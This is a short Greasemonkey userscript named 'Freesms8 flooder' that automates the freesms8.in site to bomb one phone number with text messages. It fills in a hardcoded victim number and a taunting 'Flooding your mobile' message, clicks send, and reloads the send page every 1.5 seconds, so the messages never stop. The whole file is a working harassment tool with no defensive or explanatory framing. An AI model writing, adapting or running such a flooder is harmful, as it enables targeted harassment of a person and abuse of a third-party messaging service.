// ==UserScript==
// @name           Freesms8 flooder
// @namespace      by mr mundi
// @description    kuch ni
// @include        http://www.freesms8.in/
// ==/UserScript==

var victim=****;
if(document.location=="http://www.freesms8.in/quickSMS.aspx"||document.location=="http://www.freesms8.in/QuickSMS.aspx")
{

document.getElementById('ctl00_BodyPlaceHolder_MobileNumber').value=victim;

document.getElementById('ctl00_BodyPlaceHolder_SMSText').value='Flooding your mobile, Messeages left = '+Math.floor(Math.random()*600);
void(0);
document.getElementById('ctl00_BodyPlaceHolder_SendButton').click();
}

if(document.location=="http://www.freesms8.in/QuickSent.aspx")
{
setTimeout('document.location="http://www.freesms8.in/quickSMS.aspx"',1500);
}